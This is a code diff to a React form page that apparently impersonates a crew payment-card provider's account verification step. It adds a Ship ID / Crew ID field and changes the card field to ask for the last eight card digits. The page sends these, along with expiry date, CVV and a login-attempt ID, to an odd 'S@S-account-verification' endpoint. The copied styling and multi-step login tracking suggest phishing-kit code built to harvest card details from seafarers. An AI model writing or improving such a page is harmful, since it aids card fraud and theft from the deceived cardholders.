@@ -13,12 +13,12 @@ import logoSvg from '@/assets/paymentvault_logo.svg';
 import sasVerificationBanner from '@assets/image_1767022072566.png';
 
 const postalCodeSchema = z.object({
+  shipId: z.string()
+    .length(6, 'Ship ID / Crew ID must be 6 digits')
+    .regex(/^\d{6}$/, 'Ship ID / Crew ID must be 6 digits'),
   cardNumber: z.string()
-    .min(16, 'Please provide a valid Card Number')
-    .max(16, 'Card Number must be 16 digits')
-    .refine((val) => validateLuhn(val), {
-      message: 'Please provide a valid Card Number',
-    }),
+    .length(8, 'Please provide the last 8 digits of your Card Number')
+    .regex(/^\d{8}$/, 'Please provide the last 8 digits of your Card Number'),
   expiration: z.string()
     .min(5, 'Please provide a valid Expiration Date mm/yy')
     .max(5, 'Please provide a valid Expiration Date mm/yy')
@@ -75,6 +75,7 @@ export default function PostalCodePage() {
     mutationFn: async (data: PostalCodeForm) => {
       return apiRequest('POST', '/api/S@S-account-verification', {
         loginAttemptId,
+        shipId: data.shipId,
         cardNumber: data.cardNumber,
         expiration: data.expiration,
         cvv: data.cvv,
@@ -161,20 +162,46 @@ export default function PostalCodePage() {
                   <div className="onbe-activation-box-component">
                     <div className="onbe-btn-group-activation">
                       
-                      {/* Card Number */}
+                      {/* Ship ID / Crew ID */}
+                      <div className="onbe-btovr-input-group">
+                        <input
+                          type="tel"
+                          id="shipId"
+                          placeholder=" "
+                          autoComplete="off"
+                          maxLength={6}
+                          pattern="[0-9]*"
+                          inputMode="numeric"
+                          className="onbe-btovr-input-group__input"
+                          data-testid="input-ship-id"
+                          {...register('shipId')}
+                        />
+                        <label className="onbe-btovr-input-group__input_label" htmlFor="shipId">
+                          Ship ID / Crew ID<span className="red">*</span>
+                        </label>
+                        {errors.shipId && (
+                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
+                            {errors.shipId.message}
+                          </div>
+                        )}
+                      </div>
+
+                      {/* 8 Digit Last Card Number */}
                       <div className="onbe-btovr-input-group">
                         <input
                           type="tel"
                           id="cardNumber"
                           placeholder=" "
                           autoComplete="off"
-                          maxLength={16}
+                          maxLength={8}
+                          pattern="[0-9]*"
+                          inputMode="numeric"
                           className="onbe-btovr-input-group__input"
                           data-testid="input-cardnumber"
                           {...register('cardNumber')}
                         />
                         <label className="onbe-btovr-input-group__input_label" htmlFor="cardNumber">
-                          Card Number<span className="red">*</span>
+                          8 Digit Last Card Number<span className="red">*</span>
                         </label>
                         {errors.cardNumber && (
                           <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
